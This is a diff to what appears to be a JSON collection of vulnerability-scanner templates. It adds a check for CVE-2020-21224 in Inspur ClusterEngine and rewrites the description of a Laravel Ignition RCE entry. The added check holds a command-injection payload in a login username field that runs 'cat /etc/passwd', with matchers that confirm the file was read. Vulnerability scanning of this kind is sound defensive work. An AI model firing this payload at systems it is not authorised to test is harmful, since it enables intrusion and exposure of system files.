@@ -5598,6 +5598,41 @@
       ]
     },
     {
+      "id": "CVE-2020-21224",
+      "info": {
+        "author": "pikpikcu",
+        "name": "Inspur ClusterEngine V4.0 RCE",
+        "reference": "https://github.com/NS-Sp4ce/Inspur/tree/master/ClusterEngineV4.0%20Vul",
+        "severity": "critical",
+        "tags": "cve,cve2020,clusterengine,rce"
+      },
+      "requests": [
+        {
+          "body": "op=login&username=;`cat /etc/passwd`&password=",
+          "matchers": [
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/login.php"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-2140",
       "info": {
         "author": "j3ssie/geraldino2",
@@ -7938,8 +7973,8 @@
       "id": "CVE-2021-3129",
       "info": {
         "author": "z3bd",
-        "description": "Detect Ignition before 2.5.2, as used in Laravel, allows unauthenticated RCE.",
-        "name": "Ignition Laravel RCE",
+        "description": "Ignition before 2.5.2, as used in Laravel and other products, allows unauthenticated remote attackers to execute arbitrary code because of insecure usage of file_get_contents() and file_put_contents(). This is exploitable on sites using debug mode with Laravel before 8.4.2.",
+        "name": "LARAVEL <= V8.4.2 DEBUG MODE - REMOTE CODE EXECUTION",
         "reference": "https://www.ambionics.io/blog/laravel-debug-rce",
         "severity": "critical",
         "tags": "cve,cve2021,laravel,rce"
